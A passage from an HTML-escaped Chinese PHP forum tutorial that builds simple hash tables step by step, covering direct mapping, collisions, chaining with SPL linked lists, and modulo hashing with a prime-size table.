&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return ''false'';&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&amp;nbsp;else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return ''TRUE'';&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1=new hash1();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(0);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(1);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=echo&quot; class=&quot;t_tag&quot;&gt;echo&lt;/span&gt; $hash1-&amp;gt;contain(3);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 注意，我这里用的是fixedArray来作为存储的容器，而不是普通的array。因为fixedArray更接近于C语言里的数组概念，而array和C里面的经典数组根本是两码事。你在这个例子里可以把数组的长度改为1试试，运行时就会报错。就像C语言里一样，数组定义的时候就必须指明长度，分配内存。至于SplFixedArray的内部实现到底如何，是不是等同于C里的数组，我没看&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%BA%90%E7%A0%81&quot; class=&quot;t_tag&quot;&gt;源码&lt;/span&gt;也不得而知。暂且这么认为，这并不影响下面的讲述。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 新的需求出来了，同样只需要保存10个数字，只不过这次不是保存0～9，而是需要保存10～19。怎么办，我只要增加一个ha()函数，实现这个空间里的值与地址的映射。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; class hash1{&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;private $array;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function __construct() {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array=new SplFixedArray(10);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function Ha($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return $i-10;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function add($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array[$this-&amp;gt;Ha($i)]=$i;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function contain($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if ($this-&amp;gt;array[$this-&amp;gt;Ha($i)]==null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return ''false'';&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}else{&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return ''TRUE'';&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1=new hash1();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(11);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(14);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; echo $hash1-&amp;gt;contain(13).PHP_EOL;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; echo $hash1-&amp;gt;contain(14);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 好，继续提需求。现在要在我这10个空间里放0-19这20个数字咋办？空间不够，挤着睡呗。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 更改我们的映射函数如下：&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function Ha($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if(0&amp;lt;$i&amp;amp;&amp;amp;$i&amp;lt;10){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return $i;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp;&amp;nbsp;else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return $i-10;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 测试：&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1=new hash1();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(2);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(15);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(13);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1-&amp;gt;contain(2));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1-&amp;gt;contain(15));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1-&amp;gt;contain(13));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hash1-&amp;gt;add(3);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1-&amp;gt;contain(3));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hash1-&amp;gt;contain(13));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 好了，测试下，可以看到，我们把20个&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E6%95%B0%E6%8D%AE&quot; class=&quot;t_tag&quot;&gt;数据&lt;/span&gt;硬塞到10个空间里了。在第一次塞数据时，我塞了2,15,13，它们互相占据不同的位置，我是能逐个找到他们的。然后我塞进来一个3，它和13占据的是同一个空间，现在3进来了，13不见了。3和13住到了同一间屋里，我无法确定第3个位置是3还是13，这时我们说发生碰撞了。怎么办？这个时候，我们可以用链法（也叫拉链法，很形象的说）来处理。所谓链法就是数组中每个元素均为一个链表，所有哈希到同一数据index的key，其值均位于同一个元素的链表中。简单的说，就是让发生碰撞的2人住2间，但是共用1个公共地址。这就是碰撞的处理-另安一个床位。为了简单起见，可以让数组的每个“元素”都指向一个链表：&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\nclass hashset2 {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; public $array;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; public function __construct() {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;$this-&amp;gt;array = new SplFixedArray(10);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; public function Ha($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if (0 &amp;lt;= $i &amp;amp;&amp;amp; $i &amp;lt; 10) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return $i;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;} else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return $i - 10;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; public function add($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if ($this-&amp;gt;array[$this-&amp;gt;Ha($i)] == null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$linklist = new SplDoublyLinkedList();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$linklist-&amp;gt;push($i);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array[$this-&amp;gt;Ha($i)] = $linklist;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;} else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$linklist = $this-&amp;gt;array[$this-&amp;gt;Ha($i)];&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$linklist-&amp;gt;push($i);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; public function contain($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if ($this-&amp;gt;array[$this-&amp;gt;Ha($i)] == null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return FALSE;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;} else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$linklist = $this-&amp;gt;array[$this-&amp;gt;Ha($i)];&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$count = $linklist-&amp;gt;count();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;for ($j = 0; $j &amp;lt;= $count; $j++) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; if($linklist-&amp;gt;offsetGet($j)==$i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;return TRUE;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n$hash1 = new hashset2();&lt;br /&gt;\r\n$hash1-&amp;gt;add(2);&lt;br /&gt;\r\n$hash1-&amp;gt;add(15);&lt;br /&gt;\r\n$hash1-&amp;gt;add(12);&lt;br /&gt;\r\nvar_dump($hash1-&amp;gt;array[2]-&amp;gt;offsetGet(1));&lt;br /&gt;\r\nvar_dump($hash1-&amp;gt;array[5]);&lt;br /&gt;\r\nvar_dump($hash1-&amp;gt;contain(2));&lt;br /&gt;\r\nvar_dump($hash1-&amp;gt;contain(15));&lt;br /&gt;\r\nvar_dump($hash1-&amp;gt;contain(12));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 出于php的语言特性，为了实现&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E4%BB%A3%E7%A0%81&quot; class=&quot;t_tag&quot;&gt;代码&lt;/span&gt;最大程度的简洁，我对代码做了少许调整，利用了SPL的双向链表来解决碰撞。代码中尚存在一些不完善的地方。通过用链接法，我们就能很好的处理碰撞。那还有其他方法能处理碰撞吗？下面再介绍一种留余散列法。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 公式如下：h(k) = k mod m&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 把我们的核心函数ha()修改为&lt;br /&gt;\r\npublic function Ha($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;return $i%10;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 其他部分不变，这样我们的这个散列就能接受任意大小的数据，并给它找到一个合适的归属了。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; $hashmod=new hash2();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(3));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(93));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; var_dump($hashmod-&amp;gt;Ha(45));&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 很明显，由余数的定理我们知道，任何一个整数对10取模的结果都是小于10的，那我们就能在我们给他开辟的空间里找到一个key，把value塞进去。你又要问了，93和3除10的余数都是3，那它们岂不是碰撞了呢。似的，没错，它们的确碰撞了。如果我们让可能产生碰撞的两个value比较分散，那是不是就可以降低碰撞的概率了呢？通常我们会选择指数做m，让 k%m的结果尽可能分散。一个好的散列函数应该保证一个均匀的分散。&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 也就是说当&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%94%A8%E6%88%B7&quot; class=&quot;t_tag&quot;&gt;用户&lt;/span&gt;指定我要一个10个坑位的空间，我说好，但实际上我并不是真正的挖了10个坑位，而是找到一个最接近10的m值，让k%m的结果尽可能分散，而这个m一般是最接近10的一个质数，如11.&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; 来看看修改后的&lt;span href=&quot;http://bbs.phpchina.com/tag.php?name=%E7%A8%8B%E5%BA%8F&quot; class=&quot;t_tag&quot;&gt;程序&lt;/span&gt;：&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &amp;lt;?php&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; class hash2 {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public $array;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;private $reallysize;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;private $primetable=array(3, 7, 11, 17, 23, 29, 37, 47, 59, 71, 89, 107, 131, 163, 197, 239, 293, 353, 431, 521, 631, 761, 919,1103, 1327, 1597, 1931, 2333, 2801, 3371, 4049, 4861, 5839, 7013, 8419, 10103, 12143, 14591,17519, 21023, 25229, 30293, 36353, 43627, 52361, 62851, 75431, 90523, 108631, 130363, 156437,187751, 225307, 270371, 324449, 389357, 467237, 560689, 672827, 807403, 968897, 1162687, 1395263,1674319, 2009191, 2411033, 2893249, 3471899, 4166287, 4999559, 5999471, 7199369);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function __construct($size){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;reallysize=$this-&amp;gt;getPrime($size);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$this-&amp;gt;array = new SplFixedArray($this-&amp;gt;reallysize);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function Ha($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return $i%$this-&amp;gt;reallysize;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function isPrime($i){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; if($i&amp;amp;1!=0){//如果是奇数&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;$middle=intval($i/2);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;for ($j= 3; $j&amp;lt;=$middle; $j+=2) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if($i%$j==0)&amp;nbsp;&amp;nbsp;return false;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;return TRUE;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; return ($i==2);&amp;nbsp;&amp;nbsp;//2是质数里唯一的偶数&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;//如果 min 是质数，返回 min；否则返回比 min 稍大的那个质数&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function getPrime($min) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;//从质数表中查找比 min 稍大的质数&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;for ($i = 0; $i &amp;lt; count($this-&amp;gt;primetable); $i++) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; if($this-&amp;gt;primetable[$i]&amp;gt;=$min){&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;return $this-&amp;gt;primetable[$i];&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;//min 超过了质数表的范围时，探查 min 之后的每一个奇数，直到发现下一个质数&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;for ($i = ($min|1); $i &amp;lt; PHP_INT_MAX; $i+=2) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; if($this-&amp;gt;isPrime($i)) return $i;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;return min;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function add($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if ($this-&amp;gt;array[$this-&amp;gt;Ha($i)] == null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $linklist = new SplDoublyLinkedList();&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $linklist-&amp;gt;push($i);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $this-&amp;gt;array[$this-&amp;gt;Ha($i)] = $linklist;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;} else {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $linklist = $this-&amp;gt;array[$this-&amp;gt;Ha($i)];&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; $linklist-&amp;gt;push($i);&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;public function contain($i) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if ($this-&amp;gt;array[$this-&amp;gt;Ha($i)] == null) {&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp;&amp;nbsp; 